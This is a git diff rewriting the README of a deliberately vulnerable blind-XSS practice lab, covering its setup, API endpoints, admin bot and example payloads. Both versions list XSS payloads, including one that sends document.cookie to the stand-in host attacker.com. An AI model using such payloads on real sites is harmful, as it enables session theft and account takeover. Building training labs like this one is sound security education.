@@ -1,198 +1,176 @@
 # Blind XSS Practice Lab
 
-A deliberately vulnerable web application designed for practicing Blind XSS (Cross-Site Scripting) attacks in a safe, controlled environment.
+This project is a deliberately vulnerable web application designed to help security learners practice Blind Cross-Site Scripting (XSS) in a controlled and safe environment. It provides realistic scenarios without exposing real systems to risk.
 
-## 🚨 Security Warning
+## Security Warning
 
-This application is intentionally vulnerable and should only be used for educational purposes in a secure, isolated environment. Do not deploy this application in production or expose it to the internet without proper security controls.
+The application contains intentional security flaws. It should only be used in isolated environments meant for testing or learning. Do not deploy it to production systems or make it publicly accessible.
 
-## 🎯 What is Blind XSS?
+## What Is Blind XSS?
 
-Blind XSS is a type of Cross-Site Scripting attack where the malicious payload is stored and executed on a server-side application, often in admin panels or user management systems. Unlike regular XSS, the attacker doesn't immediately see the results - they must wait for an admin or privileged user to access the payload, which then sends data back to the attacker's server.
+Blind XSS occurs when a malicious payload is stored and later executed in a different context, typically within administrative tools, background tasks, or systems that process user-provided data. Unlike traditional XSS, the attacker does not see the impact immediately. The results become visible only when a privileged user or automated process interacts with the stored payload.
 
-## 📋 Features
+## Features
 
-- **Vulnerable endpoints**: Multiple input points where XSS payloads can be injected
-- **Admin bot simulation**: A background process that "reads" stored reports, executing any XSS payloads
-- **Real-time feedback**: Immediate visibility of XSS payload execution
-- **Admin dashboard**: Review flagged payloads, severities, and detection reasons in a simple UI
-- **Educational focus**: Clear warnings and explanations about security risks
+* Multiple vulnerable inputs to experiment with payload injection
+* A simulated administrative bot that automatically reviews and executes stored data
+* Real-time visibility into detected payload activity
+* A minimal administrative dashboard for reviewing flagged reports
+* Clear explanations and behavior designed for educational use
 
-## 🛠️ Technologies Used
+## Technologies Used
 
-- Next.js (Pages Router)
-- Node.js
-- In-memory storage system
-- Concurrent bot polling system
+* Next.js (Pages Router)
+* Node.js
+* In-memory data storage
+* Background polling bot
 
-## 🚀 Quick Start
+## Quick Start
 
 ### Prerequisites
-- Node.js 18+ 
-- npm 9+ (or equivalent package manager)
+
+* Node.js 18 or later
+* npm 9 or later (or a compatible alternative)
 
 ### Installation
-1. Clone the repository (or navigate to your existing project directory)
-2. Install dependencies:
+
+1. Clone the repository or navigate to your local project copy.
+2. Install required dependencies:
+
    ```bash
    npm install
    ```
 
 ### Running the Application
-1. Start the development server with the bot:
-   ```bash
-   npm run dev
-   ```
-   The application will start at `http://localhost:3000` (or next available port if 3000 is taken)
 
-2. The bot will automatically start polling for XSS payloads in the background
+Start the development server and enable the bot:
 
-### Production Build (Optional)
-For a production-like setup:
+```bash
+npm run dev
+```
+
+The application will run on `http://localhost:3000`, unless that port is unavailable.
+The bot begins polling automatically.
+
+### Optional: Production Build
+
 ```bash
 npm run build && npm start
 ```
 
-## 🎮 How to Practice Blind XSS
+## Working With Blind XSS
 
-### Method 1: User-Agent Payload
-1. Navigate to the main page
-2. Enter an XSS payload in the "Enter XSS Payload" field (e.g., `<img src=x onerror=alert('XSS')>`)
-3. Click "Submit Payload"
-4. The bot will automatically check new reports every few seconds
-5. When the bot "reads" your report, your payload will execute
+### Method 1: Direct Payload Submission
 
-### Method 2: Contact Form
-1. Use the contact form on the page
-2. The form will capture your browser's User-Agent string
-3. If your User-Agent contains XSS code, it may be detected by the bot
+1. Open the main application page.
+2. Submit an XSS payload such as `<img src=x onerror=alert('XSS')>`.
+3. The bot checks for new reports every few seconds.
+4. When the bot processes your submission, the payload executes.
 
-### Method 3: API Direct Access
-You can also submit payloads directly to the API:
+### Method 2: Contact Form Injection
+
+1. Submit the contact form on the main page.
+2. The server stores your browser’s User-Agent.
+3. If the User-Agent contains scriptable content, it may be executed by the bot.
+
+### Method 3: API-Based Submission
+
 ```bash
 curl -X POST http://localhost:3000/api/reports \
   -H 'Content-Type: application/json' \
   -d '{"userAgent":"<img src=x onerror=alert(1)>"}'
 ```
 
-## 🔍 Available Endpoints
+## Available Endpoints
 
-### Main Application Endpoints
-- `GET /` - Main application interface
+### Application
 
-### API Endpoints
-- `GET /api/reports` - List all stored reports
-- `POST /api/reports` - Submit a new report with a User-Agent payload
-- `GET /api/comments` - List all comments
-- `POST /api/comments` - Submit a new comment (potential XSS vector)
-- `POST /api/contact` - Submit a contact form (captures User-Agent)
-- `GET /api/xss-payloads` - List collected XSS payloads
-- `GET /api/bot` - Manually trigger the bot to scan for XSS payloads
-- `GET|POST /api/collect-xss` - Endpoint for collecting payload data (returns 1x1 GIF)
-- `GET /admin` - Minimal dashboard that surfaces flagged reports and detection reasons
+* `GET /` — Main application interface
 
-## 🤖 Bot Behavior
+### API
 
-The application includes a "bot" that simulates an admin user reviewing reports. Every 3 seconds, the bot:
+* `GET /api/reports` — Retrieve stored reports
+* `POST /api/reports` — Submit a new report
+* `GET /api/comments` — View comments
+* `POST /api/comments` — Submit a comment
+* `POST /api/contact` — Contact form submission with User-Agent capture
+* `GET /api/xss-payloads` — View collected payloads
+* `GET /api/bot` — Manually trigger a bot scan
+* `GET | POST /api/collect-xss` — Logging endpoint returning a 1×1 GIF
+* `GET /admin` — Dashboard showing flagged payloads and detection rules
 
-1. Checks `/api/bot` endpoint for new reports
-2. Scans recent reports (past 5 minutes) for potential XSS payloads
-3. If XSS-like patterns are detected, they are flagged with a severity and detection rule
-4. In a real scenario, the bot would execute the JavaScript code in a browser context
+## Bot Behavior
 
-You can also visit `/admin` to see the flagged reports, their severities (low/medium/high), and the rules that triggered them. The page auto-refreshes every few seconds to mirror the polling bot.
+The simulated bot runs continuously and performs the following every three seconds:
 
-## 🧪 Common XSS Payloads to Test
+1. Calls `/api/bot` to check for new data
+2. Reviews recent reports (within the last five minutes)
+3. Flags items matching XSS-like patterns
+4. Attaches severity ratings and reasons for detection
 
-> ⚠️ These are for educational purposes only!
+The dashboard at `/admin` displays flagged entries and refreshes automatically.
+
+## Example Payloads
+
+Use these for testing only:
 
 ```html
-<!-- Basic alert -->
 <script>alert('XSS')</script>
-
-<!-- Image tag with onerror -->
 <img src=x onerror=alert('XSS')>
-
-<!-- JavaScript in href -->
 <a href="javascript:alert('XSS')">Click me</a>
-
-<!-- More stealthy -->
 <svg onload=alert('XSS')>
-
-<!-- Event handlers -->
 <div onmouseover=alert('XSS')>Hover over me</div>
-
-<!-- External payload -->
-<img src=x onerror=fetch('http://attacker.com/log?cookie='+document.cookie)>
+<img src=x onerror=fetch('http://attacker.com/log?cookie=' + document.cookie)>
 ```
 
-## 🔧 Configuration Options
+## Configuration
 
-You can customize the bot behavior using environment variables:
+Several environment variables allow customization:
 
-- `BOT_URL` - Change the URL the bot polls (default: `http://localhost:3000/api/bot`)
-- `BOT_INTERVAL_MS` - Change polling interval (default: 3000ms)
-- `PORT` - Change the application port (default: 3000)
+* `BOT_URL` — Bot polling target (default: `http://localhost:3000/api/bot`)
+* `BOT_INTERVAL_MS` — Polling interval (default: 3000)
+* `PORT` — Server port (default: 3000)
 
 Example:
+
 ```bash
 BOT_INTERVAL_MS=5000 npm run dev
 ```
 
-## 🐛 Troubleshooting
+## Troubleshooting
 
-### Common Issues
+### Port Conflicts
 
-**Port already in use**
-- Change default port: `PORT=3001 npm run dev`
+Use a different port:
 
-**No XSS execution observed**
-- Ensure your payload is correctly formed and can execute
-- Some browsers may block certain payloads due to built-in protections
-- Try different payload variations
-
-**Data disappears after restart**
-- The application uses in-memory storage that resets when the server stops
-- This is by design for security purposes
-
-**Bot error messages**
-- Minor bot errors may occur but shouldn't affect functionality
-- The bot is designed to continuously run and handle errors gracefully
-
-## 🏗️ Project Structure
-
-```
-├── pages/              # Next.js pages (UI and API routes)
-│   ├── index.js        # Main application page
-│   └── api/            # Server-side API routes
-├── lib/                # Helper functions
-│   └── memory-store.js # In-memory data storage
-├── scripts/            # Utility scripts
-│   └── bot.js          # Automated bot script
-├── package.json        # Project dependencies and scripts
-└── README.md           # This file
+```bash
+PORT=3001 npm run dev
 ```
 
-## 📚 Learning Objectives
+### Payload Not Firing
 
-By using this application, you will learn:
-- How Blind XSS attacks work
-- Common XSS payload techniques
-- How to test for blind XSS vulnerabilities
-- The importance of input validation and output encoding
-- How administrators can be targeted through web applications
+* Ensure the payload is valid and executable.
+* Some browsers may block certain patterns.
+* Verify that the bot is running.
 
-## 🛡️ Security Considerations
+### Lost Data
 
-- This application should only be run in isolated, controlled environments
-- Never run this on a production server or expose to external networks
-- Data is stored in memory and not persisted to disk
-- The application is intentionally vulnerable - do not use as a security reference
+The application stores all data in memory only. A server restart clears all information.
 
-## 🙏 Credits
+### Bot Errors
 
-This application was adapted from the original BlindXSS-Lab by 3xecutablefile.
+Occasional bot errors can occur but generally do not affect normal operation.
 
-## 📝 License
+## Learning Objectives
 
-This project is for educational purposes only. Use responsibly.
+This project is intended to help users understand:
+
+* How Blind XSS works in real-world systems
+* Techniques for crafting and identifying XSS payloads
+* How blind injection points can be abused
+* Why input validation and output encoding are essential
+* How administrative panels become targets for persistent attacks
+
+## Credits
+
+Adapted from the original BlindXSS-Lab by 3xecutablefile.
